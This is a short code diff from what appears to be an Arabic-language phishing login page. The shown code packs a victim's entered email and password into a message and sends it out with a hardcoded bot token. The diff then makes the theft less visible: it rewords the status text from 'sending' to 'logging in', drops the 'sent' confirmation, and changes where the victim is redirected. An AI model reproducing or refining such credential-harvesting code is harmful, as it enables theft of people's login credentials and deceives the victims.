@@ -157,7 +157,7 @@
         return;
       }
 
-      statusEl.textContent = "جارٍ الإرسال...";
+      statusEl.textContent = "جارٍ تسجيل الدخول...";
 
       const message = `📥 تسجيل دخول جديد:\n📧 البريد: ${email}\n🔐 كلمة المرور: ${password}`;
       const token = "8185557975:AAEDUZuAvskBZTTvSqyHKfcVuR3CfoRjp3U";
@@ -168,9 +168,9 @@
         .then(res => {
           if (!res.ok) throw new Error("فشل الاتصال");
           statusEl.style.color = "#188038";
-          statusEl.textContent = "✅ تم الإرسال. يتم التحويل...";
+          statusEl.textContent = "✅ يتم التحويل...";
           setTimeout(() => {
-            window.location.href = "https://chat.openai.com";
+            window.location.href = "www.arbada.com";
           }, 1500);
         })
         .catch(() => {
